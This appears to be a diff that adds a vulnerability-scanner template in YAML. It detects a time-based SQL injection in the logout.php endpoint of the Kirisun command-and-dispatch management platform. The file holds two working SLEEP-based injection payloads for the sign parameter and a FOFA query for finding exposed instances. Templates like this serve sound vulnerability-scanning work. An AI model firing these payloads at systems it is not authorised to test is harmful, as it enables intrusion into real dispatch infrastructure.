@@ -1,0 +1,25 @@
+id: kirisun-dispatch-platform-logout-sql
+info:
+  name: "科立讯通信指挥调度管理平台 logout.php 接口 SQL 注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="指挥调度管理平台"
+      该模板通过注入触发延迟响应的负载，检测科立讯通信指挥调度管理平台中logout.php接口存在的SQL注入漏洞。
+  tags: 科立讯通信指挥调度管理平台
+http:
+- raw:
+  - |
+    GET /custom/zx/logout.php?sign=1'+AND+(SELECT+4068+FROM+(SELECT(SLEEP(5)))Vgsc)--+qhh HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+  - |
+    GET /custom/zx/logout.php?sign=1'+AND+(SELECT+4068+FROM+(SELECT(SLEEP(8)))Vgsc)--+qhh HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
